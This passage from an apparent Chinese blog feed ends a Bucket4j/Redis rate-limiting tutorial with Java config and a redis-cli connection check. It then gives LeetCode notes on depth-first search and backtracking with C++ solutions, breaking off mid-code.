class="operator">=</span> <span class="string">&quot;rate_limit:hello&quot;</span>;</span><br><span class="line">            <span class="type">Bandwidth</span> <span class="variable">limit</span> <span class="operator">=</span> Bandwidth.classic(<span class="number">40</span>, Refill.greedy(<span class="number">40</span>, Duration.ofMinutes(<span class="number">1</span>)));</span><br><span class="line">            <span class="type">BucketConfiguration</span> <span class="variable">configuration</span> <span class="operator">=</span> BucketConfiguration.builder()</span><br><span class="line">                    .addLimit(limit)</span><br><span class="line">                    .build();</span><br><span class="line">            <span class="type">Bucket</span> <span class="variable">bucket</span> <span class="operator">=</span> proxyManager.builder().build(bucketKey, () -&gt; configuration);</span><br><span class="line">            <span class="keyword">return</span> bucket;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>错误示范：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RedisConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RedisTemplate&lt;String, Integer&gt; <span class="title function_">redisTemplate</span><span class="params">(RedisConnectionFactory redisConnectionFactory)</span> &#123;</span><br><span class="line">        RedisTemplate&lt;String, Integer&gt; template = <span class="keyword">new</span> <span class="title class_">RedisTemplate</span>&lt;&gt;();</span><br><span class="line">        template.setConnectionFactory(redisConnectionFactory);</span><br><span class="line">        template.setDefaultSerializer(<span class="keyword">new</span> <span class="title class_">GenericJackson2JsonRedisSerializer</span>());</span><br><span class="line">        <span class="keyword">return</span> template;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> Bucket <span class="title function_">bucket</span><span class="params">(RedisTemplate&lt;String, Integer&gt; redisTemplate)</span> &#123;</span><br><span class="line">        <span class="type">Bandwidth</span> <span class="variable">limit</span> <span class="operator">=</span> Bandwidth.classic(<span class="number">20</span>, Refill.greedy(<span class="number">20</span>, Duration.ofMinutes(<span class="number">1</span>)));</span><br><span class="line">        <span class="keyword">return</span> Bucket.builder().addLimit(limit).build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>虽然没有爆红，但是实际上并没有用到<code>redisTemplate</code>，尽管仍然能起到限流的作用，但是使用的是bucket的本地限流功能，并不是使用了<code>redis</code>的统一限流。</p><h2 id="四、检查redis是否存在bucket"><a href="#四、检查redis是否存在bucket" class="headerlink" title="四、检查redis是否存在bucket"></a>四、检查redis是否存在bucket</h2><p>使用命令<code>redis-cli -h your_server_host_ip -p 6379 -a your_redis_password</code>来连接你的<code>redis</code>(可能要先下载工具<code>redis-tools</code>)。<br>查询后的结果应该如下：<br><img src="https://my-github-blog.oss-cn-hangzhou.aliyuncs.com/post14/3854b46549541b5accbc3145fab69d1e.png" alt="查询结果"></p><p>如果到这里都没有问题的话就可以写脚本开始测试你的限流机制是否正确了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> Redis </tag>
            
            <tag> 限流机制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LeetCode刷题笔记(五): 搜索</title>
      <link href="/post/4c67f3df.html"/>
      <url>/post/4c67f3df.html</url>
      
        <content type="html"><![CDATA[<p>搜索算法主要包括深度优先搜索和广度优先搜索。</p><h2 id="一、深度优先搜索"><a href="#一、深度优先搜索" class="headerlink" title="一、深度优先搜索"></a>一、深度优先搜索</h2><ul><li><p>算法介绍：深度优先搜索(depth-ﬁrst search，DFS)在搜索到一个新的节点时，立即对该新节点进行遍历；因此遍历需要用先入后出的栈(stack)来实现，也可以通过与栈等价的递归来实现。对于树结构而言，由于总是对新节点调用遍历，因此看起来是向着“深”的方向前进。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    1</span><br><span class="line">   / \</span><br><span class="line">  2   3</span><br><span class="line"> /</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>考虑上面这棵简单的树，深度优先搜索的顺序为1-&gt;2-&gt;4-&gt;3。</p></li><li><p>补充：</p><ul><li>深度优先搜索可以用来检测环路：记录每个遍历过的节点的父节点，若一个节点被再次遍历且父节点不同，则说明有环。我们也可以用之后会讲到的拓扑排序判断是否有环路，若最后存在入度不为零的点，则说明有环。</li><li>有时我们可能会需要对已经搜索过的节点进行标记，以防止在遍历时重复搜索某个节点，这种做法叫做状态记录或记忆化(memoization)。</li></ul></li><li><p>题目一：<a href="https://leetcode.cn/problems/max-area-of-island">岛屿的最大面积</a><br>给定一个二维的0-1矩阵，其中0表示海洋，1表示陆地。单独的或相邻的陆地可以形成岛屿，每个格子只与其上下左右四个格子相邻。求最大的岛屿面积。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxAreaOfIsland</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        vector&lt;pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt;&gt; island;</span><br><span class="line">        vector direction = &#123;<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span> maxArea = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; grid.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">                <span class="type">int</span> localArea = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="number">1</span>) &#123;</span><br><span class="line">                    island.<span class="built_in">push_back</span>(&#123;i, j&#125;);</span><br><span class="line">                    grid[i][j] = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">while</span> (!island.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                        <span class="keyword">auto</span> [h, l] = island.<span class="built_in">back</span>();</span><br><span class="line">                        island.<span class="built_in">pop_back</span>();</span><br><span class="line">                        ++localArea;</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k) &#123;</span><br><span class="line">                            <span class="type">int</span> newH = h + direction[k], newL = l + direction[k + <span class="number">1</span>];</span><br><span class="line">                            <span class="keyword">if</span> (newH &gt;= <span class="number">0</span> &amp;&amp; newH &lt; grid.<span class="built_in">size</span>() &amp;&amp; newL &gt;= <span class="number">0</span> &amp;&amp; newL &lt; grid[<span class="number">0</span>].<span class="built_in">size</span>() &amp;&amp; grid[newH][newL] == <span class="number">1</span>) &#123;</span><br><span class="line">                                island.<span class="built_in">push_back</span>(&#123;newH, newL&#125;);</span><br><span class="line">                                grid[newH][newL] = <span class="number">0</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                maxArea = <span class="built_in">max</span>(maxArea, localArea);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxArea;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>解答二(递归解法)：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxAreaOfIsland</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> maxArea = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; grid.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; grid[<span class="number">0</span>].<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="number">1</span>)</span><br><span class="line">                    maxArea = <span class="built_in">max</span>(maxArea, <span class="built_in">dfs</span>(grid, i, j));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> maxArea;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid, <span class="type">int</span> i, <span class="type">int</span> j)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">0</span> || i &gt;= grid.<span class="built_in">size</span>() || j &lt; <span class="number">0</span> || j &gt;= grid[<span class="number">0</span>].<span class="built_in">size</span>() || grid[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        grid[i][j] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> + <span class="built_in">dfs</span>(grid, i + <span class="number">1</span>, j) + <span class="built_in">dfs</span>(grid, i - <span class="number">1</span>, j) + <span class="built_in">dfs</span>(grid, i, j + <span class="number">1</span>) + <span class="built_in">dfs</span>(grid, i, j - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：非常标准的深度搜索题，要记得做状态记录。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/number-of-provinces">省份数量</a><br>给定一个二维的0-1矩阵，如果第(i, j)位置是1，则表示第i个城市和第j个城市处于同一城市圈。已知城市的相邻关系是可以传递的，即如果a和b相邻，b和c相邻，那么a和c也相邻，换言之这三个城市处于同一个城市圈之内。求一共有多少个城市圈。<br><img src="https://assets.leetcode.com/uploads/2020/12/24/graph1.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">dfs</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;isConnected, <span class="type">int</span> i, vector&lt;<span class="type">bool</span>&gt; &amp;visited)</span> </span>&#123;</span><br><span class="line">        visited[i] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; isConnected.<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isConnected[i][j] == <span class="number">1</span> &amp;&amp; !visited[j]) &#123;</span><br><span class="line">                <span class="built_in">dfs</span>(isConnected, j, visited);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findCircleNum</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;isConnected)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = isConnected.<span class="built_in">size</span>(), count = <span class="number">0</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">bool</span>&gt; <span class="title">visited</span><span class="params">(n, <span class="literal">false</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!visited[i]) &#123;</span><br><span class="line">                <span class="built_in">dfs</span>(isConnected, i, visited);</span><br><span class="line">                ++count;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：使用状态数组来记录状态。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/pacific-atlantic-water-flow">太平洋大西洋水流问题</a><br>给定一个二维的非负整数矩阵，每个位置的值表示海拔高度。假设左边和上边是太平洋，右边和下边是大西洋，求从哪些位置向下流水，可以流到太平洋和大西洋。水只能从海拔高的位置流到海拔低或相同的位置。<br><img src="https://assets.leetcode.com/uploads/2021/06/08/waterflow-grid.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;<span class="type">int</span>&gt; directions = &#123;<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">-1</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">pacificAtlantic</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; heights) &#123;</span><br><span class="line">        <span class="type">int</span> m = heights.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = heights[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; res;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">canReachP</span>(m, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">canReachA</span>(m, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="built_in">flow</span>(heights, canReachP, i, <span class="number">0</span>);</span><br><span class="line">            <span class="built_in">flow</span>(heights, canReachA, i, n - <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            <span class="built_in">flow</span>(heights, canReachP, <span class="number">0</span>, i);</span><br><span class="line">            <span class="built_in">flow</span>(heights, canReachA, m - <span class="number">1</span>, i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (canReachA[i][j] &amp;&amp; canReachP[i][j])</span><br><span class="line">                    res.<span class="built_in">push_back</span>(&#123;i, j&#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">flow</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; heights, vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt;&amp; canReach, <span class="type">int</span> l, <span class="type">int</span> c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (canReach[l][c]) <span class="keyword">return</span>;</span><br><span class="line">        canReach[l][c] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> x = l + directions[i], y = c + directions[i + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">if</span> (x &gt;= <span class="number">0</span> &amp;&amp; x &lt; heights.<span class="built_in">size</span>() &amp;&amp; y &gt;= <span class="number">0</span> &amp;&amp; y &lt; heights[<span class="number">0</span>].<span class="built_in">size</span>() &amp;&amp; heights[x][y] &gt;= heights[l][c])</span><br><span class="line">                <span class="built_in">flow</span>(heights, canReach, x, y);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：关键在于确定起点位置，这道题因为二维数组起点不固定，可以想一想从海上出发，”逆流而上”能到达的点即是可以到达海平面的点。</p></li></ul><h2 id="二、回溯法"><a href="#二、回溯法" class="headerlink" title="二、回溯法"></a>二、回溯法</h2><ul><li><p>算法介绍：回溯法(backtracking)是优先搜索的一种特殊情况，又称为试探法，常用于需要记录节点状态的深度优先搜索。通常来说，排列、组合、选择类问题使用回溯法比较方便。<br>顾名思义，回溯法的核心是回溯。在搜索到某一节点的时候，如果我们发现目前的节点(及其子节点)并不是需求目标时，我们回退到原来的节点继续搜索，并且把在目前节点修改的<strong>状态还原</strong>。</p></li><li><p>补充：</p><ul><li>回溯法修改一般有两种情况，一种是修改<strong>最后一位输出</strong>，比如排列组合；一种是修改<strong>访问标记</strong>，比如矩阵里搜字符串。</li><li>两个小诀窍，<strong>一是按引用传状态，二是所有的状态修改在递归完成后回改</strong>。</li></ul></li><li><p>题目一：<a href="https://leetcode.cn/problems/permutations">全排列</a><br>给定一个无重复数字的整数数组，求其所有的排列方式。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">permute</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; permutedNums;</span><br><span class="line">        <span class="built_in">permute</span>(nums, permutedNums, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> permutedNums;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">permute</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; permutedNums, <span class="type">int</span> length)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (length == nums.<span class="built_in">size</span>() - <span class="number">1</span>) &#123;</span><br><span class="line">            permutedNums.<span class="built_in">push_back</span>(nums);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = length; i &lt; nums.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="built_in">swap</span>(nums[i], nums[length]);</span><br><span class="line">            <span class="built_in">permute</span>(nums, permutedNums, length + <span class="number">1</span>);</span><br><span class="line">            <span class="built_in">swap</span>(nums[i], nums[length]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：记得要把swap过的swap回来。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/combinations">组合</a><br>给定一个整数n和一个整数k，求在1到n中选取k个数字的所有组合方法。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">combine</span>(<span class="type">int</span> n, <span class="type">int</span> k) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; combinedNums;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; nums;</span><br><span class="line">        <span class="built_in">combine</span>(combinedNums, nums, n, k, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> combinedNums;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">combine</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; combinedNums, vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> n, <span class="type">int</span> k, <span class="type">int</span> length)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.<span class="built_in">size</span>() == k) &#123;</span><br><span class="line">            combinedNums.<span class="built_in">push_back</span>(nums);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = length; i &lt;= n; ++i) &#123;</span><br><span class="line">            nums.<span class="built_in">push_back</span>(i);</span><br><span class="line">            <span class="built_in">combine</span>(combinedNums, nums, n, k, i + <span class="number">1</span>);</span><br><span class="line">            nums.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：和全排列本质上差不多。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/word-search">单词搜索</a><br>给定一个字母矩阵，所有的字母都与上下左右四个方向上的字母相连。给定一个字符串，求字符串能不能在字母矩阵中寻找到。<br><img src="https://assets.leetcode.com/uploads/2020/11/04/word2.jpg" alt="示例图"></p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">exist</span><span class="params">(vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board, string word)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> m = board.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = board[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt; <span class="built_in">visited</span>(m, <span class="built_in">vector</span>&lt;<span class="type">bool</span>&gt;(n, <span class="literal">false</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">dfs</span>(board, word, <span class="number">0</span>, i, j, visited)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">dfs</span><span class="params">(<span class="type">const</span> vector&lt;vector&lt;<span class="type">char</span>&gt;&gt;&amp; board, <span class="type">const</span> string&amp;word, <span class="type">int</span> length, <span class="type">int</span> x, <span class="type">int</span> y, vector&lt;vector&lt;<span class="type">bool</span>&gt;&gt;&amp;visited)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x &lt; <span class="number">0</span> || x &gt;= board.<span class="built_in">size</span>() || y &lt; <span class="number">0</span> || y &gt;= board[<span class="number">0</span>].<span class="built_in">size</span>() || visited[x][y] || board[x][y] != word[length])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (word.<span class="built_in">length</span>() &lt;= length + <span class="number">1</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        visited[x][y] = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">dfs</span>(board, word, length + <span class="number">1</span>, x - <span class="number">1</span>, y, visited) ||</span><br><span class="line">            <span class="built_in">dfs</span>(board, word, length + <span class="number">1</span>, x + <span class="number">1</span>, y, visited) ||</span><br><span class="line">            <span class="built_in">dfs</span>(board, word, length + <span class="number">1</span>, x, y - <span class="number">1</span>, visited) ||</span><br><span class="line">            <span class="built_in">dfs</span>(board, word, length + <span class="number">1</span>, x, y + <span class="number">1</span>, visited))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        visited[x][y] = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span 